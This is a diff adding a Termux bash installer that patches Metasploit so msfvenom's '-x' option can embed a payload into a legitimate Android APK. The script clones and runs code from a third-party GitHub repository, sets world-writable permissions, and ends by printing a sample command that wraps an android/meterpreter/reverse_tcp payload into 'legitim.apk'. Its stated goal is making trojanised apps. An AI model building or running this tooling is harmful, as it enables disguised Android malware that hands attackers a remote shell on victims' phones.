@@ -1,0 +1,127 @@
+#!/system/bin/env bash
+# Coded by Ivam3 on Ago 2018
+set -euo pipefail
+IFS=$'\n\t'
+#Var
+	R='\033[1;31m'
+        G='\033[1;32m'
+        Y='\033[1;33m'
+        B='\033[1;34m'
+        M='\033[1;35m'
+        C='\033[1;36m'
+        W='\033[0m'
+	arm=$(find $PREFIX/share/ -name "jdk8_arm.tar.gz" -type f)
+	aarch=$(find $PREFIX/share/ -name "jdk8_aarch64.tar.gz" -type f)
+
+trap ctrl_c 2
+function ctrl_c () {
+	echo
+	printf "$Y [!]$R Going me on https://t.me/Ivam3by_Cinderella$W
+	\n"
+}
+function Chao_chao {
+	echo "
+        "
+        printf "$C"
+        echo "#-----THANKS TO MY MASTER CINDERELLA-----#"
+        echo "#                                        #"
+        echo "#             People don't die           #"
+        echo "#    If they still live in the hearts    #"
+        echo "#           of their loved ones          #"
+        echo "#       We love her ... We miss her      #"
+        echo "#                                        #"
+        echo "#-------------------RIP------------------#"
+        printf "$W"
+	echo "
+        "
+}
+
+	echo $(clear)
+        printf "$C"
+        echo "         -{ IbyC > fix-arg-x } "
+        echo "   -{ SO > Android - Only for Termux } "
+        echo "              -{ Coded by } "
+        printf "$G"
+        echo "      =============================="
+        echo "      .___.                 ______,"
+        echo "      |   |__ ______   ___  \_____ \ "
+        echo "      |   \ \/ /\__ \ /   \   _(__ <,"
+	echo "      |   |\   / __ \| Y Y \ /      \ "       
+	echo "      |___| \_/ (____|__|_| /______ /"
+        echo "                     \/    \/      \/ "
+        echo "      ====== By ___ Cinderella ======"
+	echo
+printf "$C"
+        echo "          [---] Join me on [---]"
+        echo "[-] www.youtube.com/c/ivam3bycinderella [-]"
+        echo "            [-] t.me/ivam3 [-]"
+        sleep 1
+printf "$R"
+        echo
+        echo "          [---] DISCLAIMER [---]"
+printf "$W"
+        echo " This file fix issues in Metasploit Framework"
+        echo "  in argument '-x' to get embed payload into"
+	echo "               legitim apk
+	\n"
+        echo " If the law is violated with it's use,"
+        echo "  This would be the responsibility of "
+        echo "        the user who handled it"
+printf "$R       [-] Use At Your Own Risk [-]"
+        echo
+        echo
+	printf "        $C Press$G enter$C to continue$W"
+	read enter
+	echo "
+	\n"
+printf "$Y [!}$C Downloading files . . .
+\n"
+
+msf=$(find $HOME -name "metasploit-framework" -type d)
+	
+	if [ -z $msf ]; then
+		printf "$Y [W]$R metasploit framework it doesn't exist , please install it before$W
+		\n"
+		Chao_chao
+	else
+		apt update && apt upgrade -y
+		pkg install git wget tar -y
+		cd $HOME
+		git clone https://github.com/ivam3/java.git
+		chmod 711 -R $HOME/java/
+		chmod 777 -R $HOME/java/openjdk/lib
+		chmod 777 $HOME/java/.embed/apk.rb
+		chmod 777 $HOME/java/openjdk/java
+		chmod 777 $HOME/java/openjdk/bin/java
+		chmod 777 $HOME/java/apktool
+		chmod 777 $HOME/java/openjdk/apktool-2.2.2.jar
+	fi
+
+	if [ -L $PREFIX/bin/signapk ]; then
+                rm $PREFIX/bin/signapk
+        fi
+	if [ -L $PREFIX/bin/zzipalign ]; then
+                rm $PREFIX/bin/zzipalign
+	fi
+
+ln -s $HOME/embed/openjdk/zzipalign $PREFIX/bin/
+ln -s $HOME/java/.embed/signapk $PREFIX/bin/
+bash $HOME/java/Ivam3
+
+	if [ -f $arm ] || [ -f $aarch ]; then
+		printf "$C"
+		Chao_chao
+		cd $HOME
+printf "$C [!]$G Finish !! \n \t Now try it following that example : \n $G msfvenom -x legitim.apk -p android/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=0000 R > embed.apk$W
+\n"
+printf "$Y [!]$W If something was wrong, JOIN me on =>$B https://t.me/Ivam3by_Cinderella$W
+\n"
+	else
+		printf "$R"
+		Chao_chao
+                printf "$R [W]$W O-ops!! Something was wrong
+                \n"
+                printf "$Y [!]$W Please take screenshot of the error \n and send it to my support group in telegram \n $Y >>$B https://t.me/Ivam3by_Cinderella$W
+                \n"
+	fi
+#							@IbyC.
